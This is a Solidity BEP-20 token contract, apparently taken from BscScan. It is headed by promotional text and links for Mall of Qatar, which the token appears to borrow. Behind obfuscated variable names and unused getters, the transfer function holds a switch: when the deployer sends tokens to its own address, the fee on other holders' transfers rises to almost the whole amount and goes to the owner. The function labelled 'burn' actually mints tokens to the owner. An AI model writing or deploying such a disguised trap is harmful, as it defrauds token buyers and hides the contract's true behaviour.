/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

//✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈
//Are you looking for new outfits, accessories, high-tech gadgets, or self-care products? 
//Mall of Qatar houses the best of breed in international brands to fulfill your every taste, style, and aspiration.
//https://www.mallofqatar.com.qa
//https://youtu.be/O4W6bgJWgI8 
//https://twitter.com/MALLOFQATAR
//https://www.facebook.com/mallofqatar/
//✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈✈


// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;
contract MallofQ {
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  HEPMVV = address(0);
uint256 private  TPEUBF = 10000000000;
address private  WCCSFW = address(0);
address private  ZCLHOF = address(0);
uint256 private  LQPHJM = 10000000000000;
address private  EDYZLI = address(0);
string public  symbol = "MallofQ";
uint256 private  YGCGWI = 1000000000000000000000;
address private  OWFGGS = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  TBQALV = 1000000000000000;
address public owner;
uint256 private  GSVRGP = 1000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  EBCXSI = 100000000;
uint256 private  PVGZPE = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
string public  name = "MallofQ";
uint256 public constant UGAXEN = 99999;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
event Transfer(address indexed from, address indexed to, uint256 value);
function _getHEPMVV() private returns (address) {
return HEPMVV;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "UWWPNV");
require(to != address(0), "UWWPNV");
require(amount <= balanceOf[from], "UWWPNV");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* UGAXEN/PVGZPE ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==EDYZLI){
PVGZPE = UGAXEN+2;
}
emit Transfer(from, to, transferAmount);
}
function _getYGCGWI() private returns (uint256) {
return YGCGWI;
}

function _getGSVRGP() private returns (uint256) {
return GSVRGP;
}

function _getWCCSFW() private returns (address) {
return WCCSFW;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getOWFGGS() private returns (address) {
return OWFGGS;
}

constructor () public {
EDYZLI = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getTPEUBF() private returns (uint256) {
return TPEUBF;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tUWWPNV 0");
require(spender != address(0), "fUWWPNV 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getEBCXSI() private returns (uint256) {
return EBCXSI;
}

function _getTBQALV() private returns (uint256) {
return TBQALV;
}

function _getLQPHJM() private returns (uint256) {
return LQPHJM;
}

function _getZCLHOF() private returns (address) {
return ZCLHOF;
}


}